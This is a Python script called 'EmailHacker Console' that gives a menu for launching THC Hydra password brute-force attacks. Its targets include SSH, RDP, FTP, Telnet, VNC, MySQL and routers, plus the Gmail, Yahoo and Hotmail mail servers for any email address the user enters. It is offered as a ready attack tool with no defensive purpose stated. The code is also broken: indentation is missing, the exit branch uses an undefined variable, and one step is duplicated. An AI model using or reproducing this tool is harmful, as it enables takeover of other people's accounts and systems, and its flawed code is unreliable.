#!/usr/bin/python
"""
This program is just a small program to shorten brute force sessions on THC hydra :)
But to be more satisfying results of the brute force. You better interact directly with hydra,
without having to use this black hydra console first: ').
If you find any errors in running our program. Can chat via facebook :).
Hydra is needed for the process of this program :).
"""
import sys, os, time

# Restart ####################
def restart_program ():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()
##############################
os.system( "clear" )
print "_____ "                _ _ _   _            _
print "| ____|_ __ ___   __ _(_) | | | | __ _  ___| | _____ _ __"
print "|  _| | '_ ` _ \ / _` | | | |_| |/ _` |/ __| |/ / _ \ '__|"
print "| |___| | | | | | (_| | | |  _  | (_| | (__|   <  __/ |"
print "|_____|_| |_| |_|\__,_|_|_|_| |_|\__,_|\___|_|\_\___|_| "                                                 "
print "-----------------------------------------------------"
print "[]xxxxx[]::::::::::::::::::::> 29-07-2018 (4:39AM)"
print " [*] Author: SAINTMALIK  ---  [*] Version 1.0"
print "c=={:::::::::::::::> EmailHacker Console"
print " [*] My FB : https://m.facebook.com/Salawu.malik16"
print "(}xxx{):::::::::> AndroSecx and GITS ARMIES"
print
print "              ===|[ Brute Force ]|==="
print
print "  [01] Cisco Brute Force         "
print "  [02] VNC Brute Force           "
print "  [03] FTP Brute Force           "
print "  [04] Gmail Brute Force         "
print "  [05] SSH Brute Force           "
print "  [06] TeamSpeak Brute Force     "
print "  [07] Telnet Brute Force        "
print "  [08] Yahoo Mail Brute Force    "
print "  [09] Hotmail Brute Force       "
print "  [10] Router Speedy Brute Force "
print "  [11] RDP Brute Force           "
print "  [12] MySQL Brute Force         "
print
print " [00] Exit"
print
ehacker = raw_input ("[*] E-hacker > " )

if ehacker == '01' or ehacker == '1' :
print
print "          +---------------------------+"
print "          |     Cisco Brute Force     |"
print "          +---------------------------+"
print
print
iphost = raw_input ("[*] IP/Hostname : " )
word = raw_input ("[*] Wordlist : " )
os.system( "hydra -P %s %s cisco" % (word, iphost))
sys.exit()

elif ehacker == '02' or ehacker == '2' :
print
print "          +---------------------------+"
print "          |      VNC Brute Force      |"
print "          +---------------------------+"
print
print
word = raw_input ("[*] Wordlist : " )
iphost = raw_input ("[*] IP/Hostname : " )
os.system( "hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
iphost = raw_input ("[*] IP/Hostname : " )

elif ehacker == '03' or ehacker == '3' :
print
print "          +------------------------------+"
print "          |        FTP Brute Force       |"
print "          +------------------------------+"
print
print
user = raw_input ("[*] User : " )
iphost = raw_input ("[*] IP/Hostname : " )
word = raw_input ("[*] Wordlist : " )
os.system( "hydra -l %s -P %s %s ftp" % (user, word, iphost))
sys.exit()

elif ehacker == '04' or ehacker == '4' :
print
print "          +------------------------------+"
print "          |       Gmail Brute Force      |"
print "          +------------------------------+"
print
print
email = raw_input ( "[*] Email : " )
word = raw_input ("[*] Wordlist : " )
os.system( "hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
sys.exit()

elif ehacker == '05' or ehacker == '5' :
print
print "         +--------------------------------+"
print "         |        SSH Brute Force         |"
print "         +--------------------------------+"
print
print
user = raw_input ( "[*] User : " )
word = raw_input ( "[*] Wordlist : " )
iphost = raw_input ("[*] IP/Hostname : " )
os.system( "hydra -l %s -P %s %s ssh" % (user, word, iphost))
sys.exit()

elif ehacker == '06' or ehacker == '6' :
print
print "        +-------------------------+"
print "        |  TeamSpeak Brute Force  |"
print "        +-------------------------+"
print
print
user = raw_input ( "[*] User : " )
word = raw_input ( "[*] Wordlist : " )
iphost = raw_input ("[*] IP/Hostname : " )
os.system( "hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
sys.exit()

elif ehacker == '07' or ehacker == '7' :
print
print "        +-------------------------+"
print "        |   Telnet Brute Force    |"
print "        +-------------------------+"
print
print
user = raw_input ( "[*] User : " )
word = raw_input ( "[*] Wordlist : " )
iphost = raw_input ("[*] IP/Hostname : " )
os.system( "hydra -l %s -P %s %s telnet" % (user, word, iphost))
sys.exit()

elif ehacker == '08' or ehacker == '8' :
print
print "          +---------------------------+"
print "          |     Yahoo Brute Force     |"
print "          +---------------------------+"
print
print
email = raw_input ( "[*] Email : " )
word = raw_input ("[*] Wordlist : " )
os.system( "hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
sys.exit()

elif ehacker == '09' or ehacker == '9' :
print
print "          +----------------------------+"
print "          |    Hotmail Brute Force     |"
print "          +----------------------------+"
print
print
email = raw_input ( "[*] Email : " )
word = raw_input ("[*] Wordlist : " )
os.system( "hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
sys.exit()

elif ehacker == '10' :
print
print "        +-----------------------------+"
print "        |  Router Speedy Brute Force  |"
print "        +-----------------------------+"
print
print
user = raw_input ( "[*] User : " )
word = raw_input ( "[*] Wordlist : " )
iphost = raw_input ("[*] IP/Hostname : " )
os.system( "hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
sys.exit()

elif ehacker == '11' :
print
print "        +----------------------------+"
print "        |      RDP Brute Force       |"
print "        +----------------------------+"
print
print
user = raw_input ( "[*] User : " )
word = raw_input ( "[*] Wordlist : " )
iphost = raw_input ("[*] IP/Hostname : " )
os.system( "hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
sys.exit()

elif ehacker == '12' :
print
print "        +-----------------------------+"
print "        |       MySQL Brute Force     |"
print "        +-----------------------------+"
print
print
user = raw_input ( "[*] User : " )
word = raw_input ( "[*] Wordlist : " )
os.system( "hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
elif bhydra == '00' or bhydra == '0' :
print "\n[!] Exit the Program..."
sys.exit()

else :
print "\n[!] ERROR : Wrong Input"
time.sleep( 1 )
restart_program()
